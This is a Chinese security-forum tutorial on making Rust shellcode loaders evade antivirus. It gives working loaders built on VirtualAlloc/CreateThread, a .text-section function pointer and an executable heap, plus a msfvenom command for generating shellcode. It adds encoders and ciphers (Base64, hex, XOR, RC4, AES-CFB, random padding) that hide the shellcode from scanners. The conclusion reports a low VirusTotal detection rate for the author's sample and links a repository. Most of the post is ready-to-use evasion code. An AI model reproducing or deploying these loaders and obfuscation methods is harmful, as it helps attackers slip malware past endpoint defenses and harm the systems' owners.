

# Rust 免杀 - Shellcode 加载与混淆 - 先知社区

Rust 免杀 - Shellcode 加载与混淆



## 前言

这是半年前我学习 Rust 和免杀时的一些记录，最近打开知识库看到了这篇半年前的笔记，并且发现我常逛的安全社区都比较少有人分享 Rust 以及 Rust 免杀的帖子，于是想着将这篇笔记分享出来供大家参考和指正。由于我写这篇文章时也刚刚开始接触 Rust，所以文中所涉及的知识和代码都有可能出现错误，所以再次说明这篇文章仅供参考并希望大家指正。

## Shellcode 加载方式

本文的主要目的是分享 Rust 对 shellcode 的加密混淆方式，所以对于 shellcode 加载只介绍两种基本的方式，可能在后续的文章中会对加载方式进行更多分享。

### 调用 WinAPI

跟其他语言的 shellcode 加载器一样，要实现更多的 shellcode 加载方式，需要调用 WinAPI。  
执行 shellcode 的一般流程：

```bash
1. 创建或获取一段可读写执行的内存空间
2. 将 shellcode 移入这块内存空间
3. 利用各种方式将程序执行的流程指向这块内存空间
```

Rust 调用 WinAPI 需要先引入依赖，`Cargo`是 Rust 的一个包管理工具，要引入`winapi`依赖需要在`Cargo.toml`添加：

```bash
winapi = {version="0.3.9",features=["winuser","processthreadsapi","memoryapi","errhandlingapi","synchapi"]}
```

这里以加载 msf 生成的弹计算器的 shellcode 为例，先使用`msfvenom`生成一段 raw 格式的 shellcode，保存到`calc.bin`文件中，并复制到 Rust 的项目目录下。

```bash
msfvenom -p windows/x64/exec cmd=calc.exe -f raw -o calc.bin
```

在 Rust 中，可以使用`include_bytes!`宏将静态文件在编译时包含进程序中。  
下面通过调用`VirtualAlloc`申请一段内存，并设置为`PAGE_EXECUTE_READWRITE`权限，具体参数建议查阅微软 WinAPI 文档。然后通过`std::ptr::copy`将 shellcode 移动到内存中，接着通过`CreateThread`创建线程，`WaitForSingleObject`等待线程结束。  
参考：[VirtualAlloc function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), [CreateThread function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread), [WaitForSingleObject function](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

```bash
use std::mem::transmute;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;

fn main() {
    let buffer = include_bytes!("..\\calc.bin");

    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), buffer.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());

            let mut threadid = 0;
            let threadhandle = CreateThread(
                std::ptr::null_mut(),
                0,
                Some(transmute(ptr)),
                std::ptr::null_mut(),
                0,
                &mut threadid,
            );

            WaitForSingleObject(threadhandle, 0xFFFFFFFF);
        } else {
            println!("执行失败：{}", GetLastError());
        }
    }
}
```

### 函数指针

`link_section`是 Rust 的一个[attribute](https://doc.rust-lang.org/reference/abi.html#the-link_section-attribute)，它用来将特定的函数或者变量放到程序的指定的区块中，`.text`区块通常用来存储程序的执行代码，它会被加载到内存中并由处理器执行。  
然后通过`std::mem::transmute`将 `*const u8` 类型的指针转换为函数类型 `fn()`，最后执行 shellcode。

```bash
fn main() {
    const BUFFER_BYTES:&[u8] = include_bytes!("..\\calc.bin");
    const BUFFER_SIZE:usize = BUFFER_BYTES.len();

    #[link_section = ".text"]
    static BUFFER:[u8;BUFFER_SIZE] = *include_bytes!("..\\calc.bin");
    unsafe{
        let exec = std::mem::transmute::<*const u8,fn()>(&BUFFER as *const u8);
        exec();
    }
}
```

### 通过 heapapi 申请内存

由于`VirtualAlloc`是各大杀软的重点监控对象，所以通常需要使用其他的 API 来替代，下面介绍的是另一个常见的内存申请方式，即通过`HeapCreate/HeapAlloc`的组合来创建内存空间。  
参考：[HeapCreate function](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate), [HeapAlloc function](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc)

该方式同样需要先引入依赖，在`Cargo.toml`文件中添加如下依赖：

```bash
[dependencies]
winapi = {version="0.3.9",features=["winuser","heapapi","errhandlingapi"]}
```

该方法通过`HeapCreate`创建`HEAP_CREATE_ENABLE_EXECUTE`权限的内存堆，然后通过`HeapAlloc`来从堆中分配内存空间，最后通过函数指针的方式执行 shellcode。

```bash
use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::heapapi::HeapAlloc;
use winapi::um::heapapi::HeapCreate;

fn main() {
    let buffer = include_bytes!("..\\calc.bin");

    unsafe {
        let heap = HeapCreate(0x40000, 0, 0);
        let ptr = HeapAlloc(heap, 8, buffer.len());

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());
            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}
```

## Shellcode 混淆方式

上面介绍了在 Rust 中为 shellcode 申请内存空间和执行 shellcode 的几种常见的方式，接下来会介绍几种常见的编码和加密混淆方式在 Rust 中的实现。在实际的 shellcode 免杀的时候经常需要结合几种混淆方式，或者是自己设计加密混淆方式。

### Base64 编码

在 Rust 中实现 base64 编码同样需要引入依赖，在`Cargo.toml`文件中添加如下依赖：

```bash
[dependencies]
base64 = "0.20.0"
```

通过下面的代码即可将传入的切片类型的 shellcode 进行 base64 编码并返回一段字符串。

```bash
fn b64_enc(shellcode: &[u8]) -> String {
    base64::encode(shellcode)
}
```

通过以下代码即可将得到的字符串解码，并返回 Vec 数组类型的 shellcode。

```bash
fn b64_dec(shellcode:String) -> Vec<u8> {
    base64::decode(shellcode).expect("Error")
}
```

### Hex 编码

在 Rust 中实现 Hex 编码同样需要引入依赖，在`Cargo.toml`文件中添加如下依赖：

```bash
[dependencies]
hex = "0.4.3"
```

通过下面的代码即可将传入的切片类型的 shellcode 进行 Hex 编码并返回一段字符串。

```bash
fn hex_enc(shellcode: &[u8]) -> String {
    hex::encode(shellcode)
}
```

通过以下代码即可将得到的字符串解码，并返回 Vec 数组类型的 shellcode。

```bash
fn hex_dec(shellcode:String) -> Vec<u8> {
    hex::decode(shellcode).expect("Error")
}
```

### 异或加密

通过迭代器将 shellcode 与 key 逐个字符进行异或，然后进行 base64 编码返回一段字符串。

要进行解密，需要先进行 base64 解码，然后将异或加密后的 shellcode 再次与 key 进行逐个字符进行异或，即可还原 shellcode。

```bash
fn xor_encrypt(shellcode: &[u8], key: &[u8]) -> String {
    let mut encrypted = Vec::new();
    for (i, &b) in shellcode.iter().enumerate() {
        encrypted.push(b ^ key[i % key.len()]);
    }
    base64::encode(&encrypted)
}

fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted = base64::decode(encrypted).expect("msg");
    let mut decrypted = Vec::new();
    for (i, &b) in encrypted.iter().enumerate() {
        decrypted.push(b ^ key[i % key.len()]);
    }
    decrypted
}
```

### RC4 加密

Rust 要实现 RC4 加密与加密需要引入依赖，在`Cargo.toml`文件中添加下面的依赖。

```bash
[dependencies]
rust-crypto="0.2.36"
base64="0.13.0"
rustc-serialize = "0.3"
```

下面是实现 RC4 加解密的代码，在加密的函数中最终返回的是 Base64 编码后的字符串，而解密函数最终返回的是 Vec 数组，这是为了方便在 shellcode loader 中读取加密后的 shellcode 以及加载解密后的 shellcode。

```bash
use crypto::rc4::Rc4;
use crypto::symmetriccipher::SynchronousStreamCipher;
use std::iter::repeat;

fn main() {
    let buffer = include_bytes!("..\\calc.bin").as_slice();
    let key = "pRNtb343heAlnPFw5QiPHKxz3Z1dzLsqhiUyBNtTiI21DjUsZ0";

    let b64_string = enc(buffer, key);
    let shellcode = dec(b64_string.as_str(), key);

    println!("== RC4 ==");
    println!("Key: {}", key);
    println!("\nEncrypted (Base-64): {}", b64_string);
    println!("\nDecrypted: {:?}", shellcode);
}

fn enc(shellcode: &[u8], key: &str) -> String {
    let mut rc4 = Rc4::new(key.as_bytes());

    let mut result: Vec<u8> = repeat(0).take(shellcode.len()).collect();
    rc4.process(shellcode, &mut result);

    base64::encode(&mut result)
}

fn dec(b64: &str, key: &str) -> Vec<u8> {
    let mut result = match base64::decode(b64) {
        Ok(result) => result,
        _ => "".as_bytes().to_vec(),
    };

    let mut rc4 = Rc4::new(key.as_bytes());

    let mut shellcode: Vec<u8> = repeat(0).take(result.len()).collect();
    rc4.process(&mut result[..], &mut shellcode);

    shellcode
}
```

### AES-CFB 加密

Rust 要实现 AES 加密与加密也需要引入依赖，在`Cargo.toml`文件中添加下面的依赖。

```bash
[dependencies]
aes="0.7.5"
hex="0.4.3"
block-modes="0.8.1"
hex-literal="0.3.3"
```

下面是实现 AES-CFB 加解密的代码，在加密的函数中最终返回的是 Hex 编码后的字符串，而解密函数最终返回的是 Vec 数组，同样是为了方便在 shellcode loader 中读取加密后的 shellcode 以及加载解密后的 shellcode。

```bash
use aes::Aes128;
use block_modes::block_padding::Pkcs7;
use block_modes::{BlockMode, Cfb};
use hex::encode;
use hex_literal::hex;

type Aes128ECfb = Cfb<Aes128, Pkcs7>;

fn main() {
    let shellcode = include_bytes!("..\\calc.bin").as_slice();
    let key = "gWW8QklFyVIQfpDN";
    let iv = hex!("57504c385a78736f336b4946426a626f");

    println!("==128-bit AES CFB Mode==");
    println!("Key: {}", key);
    println!("iv: {}", encode(iv));

    let encrypted = enc(shellcode, key, iv);
    println!("\nEncrypted: {}", encrypted);

    let decrypted = dec(encrypted.as_str(), key, iv);
    println!("\nDecrypted: {:?}", decrypted);
}

fn enc(shellcode: &[u8], key: &str, iv: [u8; 16]) -> String {
    let key = key.as_bytes().to_vec();

    let cipher = Aes128ECfb::new_from_slices(key.as_slice(), iv.as_slice()).unwrap();

    let pos = shellcode.len();
    let mut buffer = [0u8; 2560];
    buffer[..pos].copy_from_slice(shellcode);

    let ciphertext = cipher.encrypt(&mut buffer, pos).unwrap();

    hex::encode(ciphertext)
}

fn dec(encrypted: &str, key: &str, iv: [u8; 16]) -> Vec<u8> {
    let binding = hex::decode(encrypted).expect("Decoding failed");
    let ciphertext = binding.as_slice();

    let key = key.as_bytes().to_vec();

    let cipher = Aes128ECfb::new_from_slices(key.as_slice(), iv.as_slice()).unwrap();

    let mut buf = ciphertext.to_vec();
    let shellcode = cipher.decrypt(&mut buf).unwrap();

    shellcode.to_vec()
}
```

### 添加随机字符

同样先在`Cargo.toml`文件中添加下面的依赖。

```bash
[dependencies]
hex = "0.4.3"
```

下面是结合异或加密和添加随机字符的代码，`xor_encrypt`将对 shellcode 与 key 进行异或，使用`hex::encode`将异或结果转为十六进制字符串返回，方便后面添加随机字符。`add_random`迭代`xor_encrypt`返回的字符串的每个字符，并在每次迭代时添加一个随机字符。最后，使用 `hex::encode` 将结果转为十六进制字符串返回。`xor_decrypt`和`rm_random`是对应的二次异或和删除随机字符的函数。

```bash
fn xor_encrypt(shellcode: &[u8], key: &[u8]) -> String {
    let mut encrypted = Vec::new();
    for (i, &b) in shellcode.iter().enumerate() {
        encrypted.push(b ^ key[i % key.len()]);
    }
    hex::encode(&encrypted)
}

fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted = hex::decode(encrypted).expect("Error");

    let mut decrypted = Vec::new();
    for (i, &b) in encrypted.iter().enumerate() {
        decrypted.push(b ^ key[i % key.len()]);
    }
    decrypted
}

fn add_random(xor_string: &str, key: &str) -> String {
    let mut result = String::new();

    for (i, c) in xor_string.chars().enumerate() {
        result.push(c);
        result.push(key.chars().nth(i % key.len()).unwrap());
    }
    hex::encode(&result)
}

fn rm_random(random_string: &str) -> Vec<u8> {
    let mut result = String::new();

    let random_string = hex::decode(random_string).expect("Invalid String");
    let random_string = match std::str::from_utf8(random_string.as_slice()) {
        Ok(s) => s,
        Err(_) => "Invalid UTF-8 sequence",
    };

    for (i, c) in random_string.chars().enumerate() {
        if i % 2 == 0 {
            result.push(c);
        }
    }
    result.as_bytes().to_vec()
}
```

## 总结

Rust 的编译体积是非常小的，虽然比不上 C/C++，但是和 Python 和 Go 相比优势还是非常大的，并且 Rust 的热门程度也远小于 Python 和 Go，所以杀软对 Rust 的检出程度也是非常低的，这都是 Rust 免杀的天然优势。结合本文章几种基础的加载方式和混淆方式还是可以轻松过一部分杀软的。以下链接是我半年前上传到 virustotal 的一个样本，半年过去了，目前的检出率为 14/71：[VirusTotal File](https://www.virustotal.com/gui/file/abb4cfcf4d8a8ce920f61201311950f82ca94c7c00f450f32f666d71c2c8c0f6/details)（刚上传时检出率为 0/71）。  
这篇文章的代码部分我也已经提交到 Github 供大家参考：  
[AV-Bypass-Learning/rust-bypass-av](https://github.com/colind0pe/AV-Bypass-Learning/tree/master/rust-bypass-av)

## 参考

[Rust 参考手册 中文版](https://rustwiki.org/zh-CN/reference/)  
[Programming reference for the Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/)  
[include\_bytes in std - Rust](https://doc.rust-lang.org/std/macro.include_bytes.html)  
[Application Binary Interface - The Rust Reference](https://doc.rust-lang.org/reference/abi.html#the-link_section-attribute)
